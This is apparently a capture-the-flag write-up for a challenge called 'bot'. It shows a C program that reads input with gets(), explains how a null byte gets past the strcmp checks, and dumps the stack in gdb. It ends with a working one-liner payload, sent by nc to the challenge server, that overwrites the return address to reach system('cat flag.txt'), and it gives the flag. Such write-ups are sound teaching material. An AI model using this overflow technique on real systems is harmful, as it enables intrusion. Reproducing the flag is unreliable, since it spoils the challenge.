# bot

Taking a look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}

```

The input needs to be one of the strings w/i the strcmp's otherwise we'll get "sorry, i didn't understand your question". 

Taking a look at strcmp:

```C
int
STRCMP (const char *p1, const char *p2)
{
  const unsigned char *s1 = (const unsigned char *) p1;
  const unsigned char *s2 = (const unsigned char *) p2;
  unsigned char c1, c2;
  do
    {
      c1 = (unsigned char) *s1++;
      c2 = (unsigned char) *s2++;
      if (c1 == '\0')
		return c1 - c2;
    }
  while (c1 == c2);
  return c1 - c2;
}
```

From this, it's possible to put a prefix of "please please please give me the flag", then a NULL byte, then the rest of the payload. 

```bash
python3 -c "print('please please please give me the flag' + '\00' + 'AAAA')" | ./bot
hi, how can i help?
i'll consider it
no
```

Now that we know an overflow is possible, we must figure out what to do with this power. 

My first thought was to overflow the `give_flag` variable. The flag variable is stored at location `0x7fffffffdbbc`. However, after looking at how the stack is initialized:

```
Breakpoint 3, 0x0000000000401282 in main () at bot.c:22
22          sleep(15);
(gdb) x/16xw $rsp
0x7fffffffdbb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdbc0: 0x61656c70      0x70206573      0x7361656c      0x6c702065
0x7fffffffdbd0: 0x65736165      0x76696720      0x656d2065      0x65687420
0x7fffffffdbe0: 0x616c6620      0x61410067      0x31614130      0x41326141
```

We are unable to write to this area of memory as it's initialized above where we can write.

Because there's an overflow, we can overwrite the return address and jump directly to the system call which `cat` flag. You can write a python3 script to automate this exploit but I just did it in a one-liner:

```bash
python3 -c "print('please please please give me the flag' + '\x00' + 'A'*33 + '\x95\x12\x40\x00\x00\x00\x00\x00')" | nc lac.tf 31180
```

flag: `lactf{hey_stop_bullying_my_bot_thats_not_nice}`